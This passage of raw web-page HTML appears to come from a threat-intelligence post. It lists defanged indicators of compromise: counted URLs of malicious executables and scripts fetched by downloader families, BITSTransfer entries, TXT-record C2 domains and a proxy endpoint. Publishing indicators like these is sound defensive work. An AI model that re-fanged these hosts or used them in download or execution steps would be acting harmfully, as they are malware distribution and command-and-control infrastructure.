class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//104[.]131.154.119:8080/index.asp</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9bc261839621-106"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//104[.]130.51.215:80/index.asp</span></div><div class="crayon-line" id="crayon-60a9b96a2c9bc261839621-107"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//100[.]100.100.100:8080/index.asp</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0036 seconds] -->
<p><strong>Downloader DFSP 2X</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9c6024930580" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
25	hxxp://93[.]174.94.135/~kali/ketty.exe
19	hxxp://94[.]102.52.13/~yahoo/stchost.exe
17	hxxp://93[.]174.94.137/~rama/jusched.exe
17	hxxp://94[.]102.52.13/~harvy/scvhost.exe
2	hxxp://10[.]10.01.10/bahoo/stchost.exe
1	hxxp://93[.]174.94.135/~harvy/verfgt.exe</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9c6024930580-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9c6024930580-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c9c6024930580-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9c6024930580-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c9c6024930580-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9c6024930580-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9c6024930580-1"><span class="crayon-cn">25</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//93[.]174.94.135/~kali/ketty.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9c6024930580-2"><span class="crayon-cn">19</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//94[.]102.52.13/~yahoo/stchost.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9c6024930580-3"><span class="crayon-cn">17</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//93[.]174.94.137/~rama/jusched.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9c6024930580-4"><span class="crayon-cn">17</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//94[.]102.52.13/~harvy/scvhost.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9c6024930580-5"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//10[.]10.01.10/bahoo/stchost.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9c6024930580-6"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//93[.]174.94.135/~harvy/verfgt.exe</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p><strong>Downloader DFSP DPL</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9c9138386388" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
2	hxxp://198[.]50.137.173/a.exe
2	hxxp://201[.]130.72.171/andac.exe
2	hxxp://worldnit[.]com/miracle.exe
2	hxxp://www[.]amspeconline.com/123/nana.exe
1	hxxp://198[.]50.137.173/b.exe
1	hxxp://31[.]184.234.74/crypted/1080qw.exe
1	hxxp://alonqood[.]com/abacom.exe
1	hxxp://alonqood[.]com/ezeke.exe
1	hxxp://alonqood[.]com/lumia.exe
1	hxxp://alonqood[.]com/nano.exe
1	hxxp://alonqood[.]com/obi.exe
1	hxxp://snthostings[.]com/billing//includes/db/dannyfinal.exe
1	hxxp://worldnit[.]com/abu.exe
1	hxxp://worldnit[.]com/guyo.exe
1	hxxp://worldnit[.]com/vc.exe
1	hxxp://www[.]amspeconline.com/123/nach.exe
1	hxxp://www[.]amspeconline.com/123/nazy.exe
1	hxxp://www[.]macwizinfo.com/zap/manage/may2.exe
1	hxxps://a[.]pomf.cat/bvudaf.exe
1	hxxps://a[.]pomf.cat/qebhhu.exe</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9c9138386388-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9c9138386388-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c9c9138386388-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9c9138386388-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c9c9138386388-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9c9138386388-6">6</div><div class="crayon-num" data-line="crayon-60a9b96a2c9c9138386388-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9c9138386388-8">8</div><div class="crayon-num" data-line="crayon-60a9b96a2c9c9138386388-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9c9138386388-10">10</div><div class="crayon-num" data-line="crayon-60a9b96a2c9c9138386388-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9c9138386388-12">12</div><div class="crayon-num" data-line="crayon-60a9b96a2c9c9138386388-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9c9138386388-14">14</div><div class="crayon-num" data-line="crayon-60a9b96a2c9c9138386388-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9c9138386388-16">16</div><div class="crayon-num" data-line="crayon-60a9b96a2c9c9138386388-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9c9138386388-18">18</div><div class="crayon-num" data-line="crayon-60a9b96a2c9c9138386388-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9c9138386388-20">20</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9c9138386388-1"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//198[.]50.137.173/a.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9c9138386388-2"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//201[.]130.72.171/andac.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9c9138386388-3"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/miracle.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9c9138386388-4"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]amspeconline.com/123/nana.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9c9138386388-5"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//198[.]50.137.173/b.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9c9138386388-6"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//31[.]184.234.74/crypted/1080qw.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9c9138386388-7"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//alonqood[.]com/abacom.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9c9138386388-8"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//alonqood[.]com/ezeke.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9c9138386388-9"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//alonqood[.]com/lumia.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9c9138386388-10"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//alonqood[.]com/nano.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9c9138386388-11"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//alonqood[.]com/obi.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9c9138386388-12"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//snthostings[.]com/billing//includes/db/dannyfinal.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9c9138386388-13"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/abu.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9c9138386388-14"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/guyo.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9c9138386388-15"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/vc.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9c9138386388-16"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]amspeconline.com/123/nach.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9c9138386388-17"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]amspeconline.com/123/nazy.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9c9138386388-18"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]macwizinfo.com/zap/manage/may2.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9c9138386388-19"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/bvudaf.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9c9138386388-20"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/qebhhu.exe</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p><strong>Downloader IEXDS</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9cb270756255" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
6	hxxp://84[.]200.84.187/Google Update Check.html
2	hxxp://52[.]183.79.94:80/TYBMkTfsQ
2	hxxp://76[.]74.127.38/default-nco.html
2	hxxp://pmlabs[.]net/cis/test.jpg
2	hxxps://wowyy[.]ga/counter.php?c=pdfxpl+
1	hxxp://192[.]168.137.241:8080/
1	hxxp://91[.]120.23.152/wizz.txt
1	hxxp://93[.]171.205.35:8080/
1	hxxp://cannot[.]loginto.me/googlehelper.ps1
1	hxxps://invesco[.]online/aaa</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9cb270756255-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9cb270756255-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c9cb270756255-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9cb270756255-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c9cb270756255-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9cb270756255-6">6</div><div class="crayon-num" data-line="crayon-60a9b96a2c9cb270756255-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9cb270756255-8">8</div><div class="crayon-num" data-line="crayon-60a9b96a2c9cb270756255-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9cb270756255-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9cb270756255-1"><span class="crayon-cn">6</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//84[.]200.84.187/Google Update Check.html</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9cb270756255-2"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//52[.]183.79.94:80/TYBMkTfsQ</span></div><div class="crayon-line" id="crayon-60a9b96a2c9cb270756255-3"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//76[.]74.127.38/default-nco.html</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9cb270756255-4"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//pmlabs[.]net/cis/test.jpg</span></div><div class="crayon-line" id="crayon-60a9b96a2c9cb270756255-5"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//wowyy[.]ga/counter.php?c=pdfxpl+</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9cb270756255-6"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//192[.]168.137.241:8080/</span></div><div class="crayon-line" id="crayon-60a9b96a2c9cb270756255-7"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//91[.]120.23.152/wizz.txt</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9cb270756255-8"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//93[.]171.205.35:8080/</span></div><div class="crayon-line" id="crayon-60a9b96a2c9cb270756255-9"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//cannot[.]loginto.me/googlehelper.ps1</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9cb270756255-10"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//invesco[.]online/aaa</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p><strong>BITSTransfer</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9d3886568196" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
11	hxxp://94[.]102.50.39/keyt.exe</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9d3886568196-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9d3886568196-1"><span class="crayon-cn">11</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//94[.]102.50.39/keyt.exe</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>TXT C2</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9d4660333286" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
4	l[.]ns.topbrains.pl
2	p[.]s.os.ns.rankingplac.pl
1	l[.]ns.huawel.ro
1	p[.]s.pn.ns.sse.net.pl
1	p[.]s.rk.ns.rankingplac.pl
1	p[.]s.w2.ns.rankingplac.pl</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9d4660333286-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9d4660333286-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c9d4660333286-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9d4660333286-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c9d4660333286-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9d4660333286-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c9d4660333286-1"><span class="crayon-cn">4</span><span class="crayon-h">	</span><span class="crayon-v">l</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-v">ns</span><span class="crayon-sy">.</span><span class="crayon-v">topbrains</span><span class="crayon-sy">.</span><span class="crayon-i">pl</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9d4660333286-2"><span class="crayon-cn">2</span><span class="crayon-h">	</span><span class="crayon-v">p</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">os</span><span class="crayon-sy">.</span><span class="crayon-v">ns</span><span class="crayon-sy">.</span><span class="crayon-v">rankingplac</span><span class="crayon-sy">.</span><span class="crayon-i">pl</span></div><div class="crayon-line" id="crayon-60a9b96a2c9d4660333286-3"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">l</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-v">ns</span><span class="crayon-sy">.</span><span class="crayon-v">huawel</span><span class="crayon-sy">.</span><span class="crayon-i">ro</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9d4660333286-4"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">p</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">pn</span><span class="crayon-sy">.</span><span class="crayon-v">ns</span><span class="crayon-sy">.</span><span class="crayon-v">sse</span><span class="crayon-sy">.</span><span class="crayon-v">net</span><span class="crayon-sy">.</span><span class="crayon-i">pl</span></div><div class="crayon-line" id="crayon-60a9b96a2c9d4660333286-5"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">p</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">rk</span><span class="crayon-sy">.</span><span class="crayon-v">ns</span><span class="crayon-sy">.</span><span class="crayon-v">rankingplac</span><span class="crayon-sy">.</span><span class="crayon-i">pl</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9d4660333286-6"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">p</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-v">w2</span><span class="crayon-sy">.</span><span class="crayon-v">ns</span><span class="crayon-sy">.</span><span class="crayon-v">rankingplac</span><span class="crayon-sy">.</span><span class="crayon-v">pl</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p><strong>Downloader Proxy</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9d5932015649" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
7	hxxp://54[.]213.195.138/s2.txt?u=
